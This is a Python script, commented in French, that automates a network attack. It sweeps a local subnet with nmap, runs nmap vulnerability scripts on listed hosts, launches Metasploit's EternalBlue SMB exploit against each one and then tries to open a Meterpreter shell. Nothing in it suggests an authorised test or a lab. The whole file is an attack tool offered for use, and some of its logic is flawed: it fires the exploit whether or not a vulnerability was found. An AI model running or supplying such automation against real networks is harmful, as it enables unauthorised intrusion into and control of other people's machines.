import subprocess
import time

# Fonction pour scanner le réseau à la recherche d'hôtes
def scan_network():
    print("Démarrage du scan réseau avec nmap...")
    result = subprocess.run(["nmap", "-sP", "192.168.1.0/24"], capture_output=True, text=True)
    if result.returncode == 0:
        print("Scan réseau terminé avec succès.")
        print("Hôtes trouvés :")
        print(result.stdout)
        return result.stdout
    else:
        print(f"Erreur lors du scan réseau : {result.stderr}")
        return None

# Fonction pour scanner les vulnérabilités d'une machine spécifique
def scan_vulnerabilities(target_ip):
    print(f"Démarrage du scan de vulnérabilité pour {target_ip}...")
    result = subprocess.run(["nmap", "--script", "vuln", target_ip], capture_output=True, text=True)
    if result.returncode == 0:
        print(f"Scan de vulnérabilité terminé pour {target_ip}.")
        print(result.stdout)
        return result.stdout
    else:
        print(f"Erreur lors du scan de vulnérabilité : {result.stderr}")
        return None

# Fonction pour exécuter Metasploit et exploiter la vulnérabilité
def run_metasploit_exploit(target_ip, exploit_name):
    print(f"Tentative d'exploitation de {exploit_name} sur {target_ip}...")
    
    # Utilisation de Metasploit avec un exploit spécifique (exemple ici : EternalBlue)
    msf_command = f"msfconsole -x 'use {exploit_name}; set RHOST {target_ip}; run'"
    
    # Exécution de la commande Metasploit
    result = subprocess.run(msf_command, shell=True, capture_output=True, text=True)
    
    # Vérifier le succès de l'exploitation
    if result.returncode == 0:
        print(f"Exploitation réussie pour {target_ip}.")
        print("Résultats de l'exploitation :")
        print(result.stdout)
        return result.stdout
    else:
        print(f"Erreur lors de l'exploitation sur {target_ip} : {result.stderr}")
        return None

# Fonction pour exécuter des actions post-exploitation (par exemple, ouvrir un shell)
def post_exploitation_actions():
    print("Lancement des actions post-exploitation...")

    # Exemple : ouvrir un shell sur la machine cible (via Meterpreter)
    # Si l'exploitation a créé une session Meterpreter, on peut l'utiliser pour ouvrir un shell
    # Ce code est un exemple générique, adapte-le à ton contexte (peut varier selon l'exploit)
    meterpreter_command = "sessions -i 1"  # Sélectionner la session exploitée (par exemple, session 1)
    result = subprocess.run(f"msfconsole -x '{meterpreter_command}'", shell=True, capture_output=True, text=True)
    
    if result.returncode == 0:
        print("Accès shell réussi ! Voici le résultat :")
        print(result.stdout)
    else:
        print(f"Erreur lors de l'exécution des actions post-exploitation : {result.stderr}")

# Fonction principale pour automatiser le processus
def main():
    # Scan du réseau pour identifier les hôtes
    network_scan_result = scan_network()
    if network_scan_result:
        # Liste des IPs à tester (tu peux extraire ces IPs du résultat du scan réseau)
        ip_addresses = ["192.168.1.100", "192.168.1.101"]  # Remplace avec les IPs de ton réseau
        for ip in ip_addresses:
            # Scan de vulnérabilités pour chaque machine
            vulnerability_scan_result = scan_vulnerabilities(ip)
            if vulnerability_scan_result:
                # Si une vulnérabilité est trouvée, essayer d'exploiter
                exploit_name = "exploit/windows/smb/ms17_010_eternalblue"  # Exemple d'exploit (change selon la vulnérabilité)
                exploit_result = run_metasploit_exploit(ip, exploit_name)
                
                # Si l'exploitation réussit, on lance des actions post-exploitation
                if exploit_result:
                    post_exploitation_actions()

if __name__ == "__main__":
    main()
